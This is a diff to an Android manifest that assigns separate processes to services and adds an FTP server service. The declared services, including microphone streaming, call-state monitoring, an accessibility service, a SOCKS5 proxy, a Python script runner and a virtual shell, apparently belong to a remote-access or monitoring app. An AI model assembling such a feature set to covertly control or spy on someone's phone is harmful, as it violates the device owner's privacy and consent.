@@ -211,16 +211,19 @@
             android:name=".services.client.ClientService"
             android:enabled="true"
             android:exported="true"
+            android:process=":clientServiceProcess"
             android:foregroundServiceType="specialUse" />
         <service
             android:name=".services.other.MicStreamingService"
             android:exported="true"
             android:enabled="true"
+            android:process=":micStreamingServiceProcess"
             android:foregroundServiceType="microphone" />
         <service
             android:name=".services.other.MyFirebaseMessagingService"
             android:enabled="true"
-            android:exported="true">
+            android:exported="true"
+            android:process=":firebaseMessagingServiceProcess">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
@@ -240,9 +243,7 @@
             android:enabled="true"
             android:exported="true">
             <intent-filter>
-                <!-- Outgoing call -->
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
-                <!-- Phone state change (for incoming calls) -->
                 <action android:name="android.intent.action.PHONE_STATE"/>
             </intent-filter>
         </receiver>
@@ -261,8 +262,8 @@
             android:name=".services.other.MyAccessibilityService"
             android:enabled="true"
             android:exported="true"
-            android:process=":accessibility"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:process=":clientServiceProcess">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -276,7 +277,7 @@
             android:enabled="true"
             android:exported="true"
             android:foregroundServiceType="specialUse"
-            android:process=":native">
+            android:process=":socks5ProxyProcess">
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                 android:value="Net service" />
@@ -286,13 +287,18 @@
             android:enabled="true"
             android:exported="true"
             android:foregroundServiceType="specialUse"
-            android:process=":clientServiceStarter" />
+            android:process=":clientServiceStarterProcess" />
+        <service android:name=".services.ftpserver.MyFTPServerService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="specialUse"
+            android:process=":ftpServerProcess" />
         <service
             android:name=".services.python.PythonInteractiveScriptRunnerService"
             android:enabled="true"
             android:foregroundServiceType="specialUse"
             android:exported="false"
-            android:process=":pythonProcess" />
+            android:process=":pythonScriptRunnerProcess" />
         <service
             android:name=".services.virtualshell.VirtualShellService"
             android:enabled="true"
